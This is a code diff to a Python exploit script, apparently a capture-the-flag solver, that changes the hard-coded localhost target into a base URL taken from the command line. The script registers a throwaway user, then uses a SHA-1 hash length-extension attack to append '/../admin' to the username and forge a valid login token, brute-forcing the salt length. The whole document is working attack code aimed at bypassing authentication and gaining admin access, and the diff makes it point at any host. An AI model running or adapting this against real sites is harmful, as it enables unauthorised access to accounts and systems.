@@ -1,6 +1,7 @@
 import base64
 import random
 import re
+import sys
 import urllib.parse
 
 import requests
@@ -21,11 +22,12 @@ def encode_session_cookie(pld, hsh):
 
     return urllib.parse.quote(pld) + "." + urllib.parse.quote(hsh)
 
+BASE_URL = sys.argv[1]
 
 s = requests.Session()
 username = 'someuser' + str(random.randint(0, 10000))
 print(username)
-r = s.post('http://localhost:8008/register.php',
+r = s.post(f'{BASE_URL}/register.php',
            data={'username': username, 'password': 'someuser', 'passport': '1234'})
 if r.status_code != 200:
     print(r.text)
@@ -41,7 +43,7 @@ print(sess_value)
 for salt_size in range(1, 30):
     sha_hl = hle_new('sha1')
     extended = sha_hl.extend(b'/../admin', username.encode(), salt_size, tok_hash)
-    r = requests.post('http://localhost:8008/login.php', allow_redirects=True,
+    r = requests.post(f'{BASE_URL}/login.php', allow_redirects=True,
                       data={'username': extended,
                             'token': sha_hl.hexdigest(),
                             'password': b'^\xd0\xb8\x93\xf1\x0c\x08\x8c\xcf\x0e\x00{\xf6\xed\xbfa'})
